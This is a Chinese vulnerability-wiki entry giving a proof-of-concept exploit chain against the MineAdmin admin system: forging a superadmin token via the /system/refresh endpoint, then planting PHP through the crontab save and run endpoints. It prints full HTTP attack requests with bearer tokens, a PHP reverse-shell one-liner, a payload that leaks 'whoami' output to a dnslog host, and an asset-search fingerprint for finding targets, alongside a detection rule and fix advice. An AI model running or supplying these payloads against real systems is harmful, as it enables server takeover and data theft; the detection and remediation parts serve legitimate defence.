---
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# MineAdmin企业级后台管理系统命令执行漏洞

MineAdmin官网：https://doc.mineadmin.com/

资产测绘语法：body="MineAdmin"

# 影响版本

MineAdmin v1.x
MineAdmin v2.x

# **漏洞描述**

MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。**此处逻辑漏洞和命令执行漏洞组合使用描述如下**：1、system/refresh处存在逻辑缺陷漏洞，”refresh”方法用于刷新 Token，攻击者可以未授权构造一个签名为超级管理员的 JWT，直接骗过系统，获取一个合法的、拥有管理员权限的新 Token。2、setting/crontab/save定时任务处存在命令执行漏洞，系统允许管理员（或通过上述逻辑缺陷漏洞获取管理员权限）创建定时任务。攻击者可以写入并执行任意 PHP 代码完全控制服务器。此系统前后端分离前端访问端口默认：8180 后端 默认API端口：9501 。该漏洞复现利用后端端口，实际环境可能会变，请自行判断。

# 漏洞复现

POC/EXP：利用system/refresh接口生成漏洞利用token

```
POST /system/refresh HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh_CN
```

![image-20260108153525634](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108153525634.png)


POC/EXP：添加恶意命令（此处用dnslog回显命令）

```
反弹shell语句是：eval('$s=stream_socket_client("tcp://127.0.0.1:7788");proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);'); 
```

```
POST /setting/crontab/save HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: zh_CN
Content-Length: 141

{"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval('$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".5yzhle6v.dnslog.pw\");');"}
```

![image-20260108153851665](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108153851665.png)


POC/EXP：执行恶意命令

```
POST /setting/crontab/run HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
Accept-Encoding: gzip, deflate
Accept-Language: zh_CN
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Content-Length: 8

{"id":2}
```

![image-20260108154028074](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108154028074.png)


![image-20260108154051036](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108154051036.png)


sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"MineAdmin - Remote Command Execution via /setting/crontab/save";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/setting/crontab/save";
    http.header; content:"Authorization: Bearer";
    http.header; content:"Content-Type: application/json;charset=UTF-8";
    http.request_body; content:"\"target\":\"eval(";
    http.request_body; pcre:"/target\":\"eval\\('[^']*shell_exec\\('[^']*\\)[^']*system\\('[^']*dnslog\\.pw[^']*'/i";
    metadata:
        service http,
        affected_product "MineAdmin企业级后台管理系统",
        vulnerability_type "Remote Command Execution",
        severity "critical";
    classtype:web-application-attack;
    sid:1000580;
    rev:1;
    priority:1;
)
```

# 漏洞修复

1.增加白名单或黑名单校验，严禁创建 type=4(Eval) 的任务，除非绝对必要且经过严格审查。
2.部署waf进行恶意命令拦截。

3./system/refresh接口进行权限校验。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
